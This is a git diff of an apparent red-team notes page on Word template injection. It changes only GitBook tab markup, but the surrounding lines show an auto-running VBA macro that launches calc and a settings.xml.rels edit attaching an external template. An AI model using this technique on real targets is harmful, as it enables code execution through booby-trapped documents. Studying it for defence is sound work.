@@ -17,8 +17,8 @@ This technique works in the following way:
 
 Alt+F8 to enter Dev mode where we can edit Macros, select `ThisDocument` and paste in:
 
-{% code-tabs %}
-{% code-tabs-item title="Doc3.dotm" %}
+{% tabs %}
+{% tab title="Doc3.dotm" %}
 ```javascript
 Sub Document_Open()
 
@@ -27,8 +27,8 @@ objShell.Run "calc"
 
 End Sub
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../../.gitbook/assets/screenshot-from-2019-03-18-22-19-22.png)
 
@@ -42,14 +42,14 @@ Rename legit.docx to legit.zip:
 
 Unzip the archive and edit `word_rels\settings.xml.rels`:
 
-{% code-tabs %}
-{% code-tabs-item title="word\_rels\\settings.xml.rels" %}
+{% tabs %}
+{% tab title="word\_rels\\settings.xml.rels" %}
 ```markup
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/></Relationships>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Note it has the target template specified here:
 
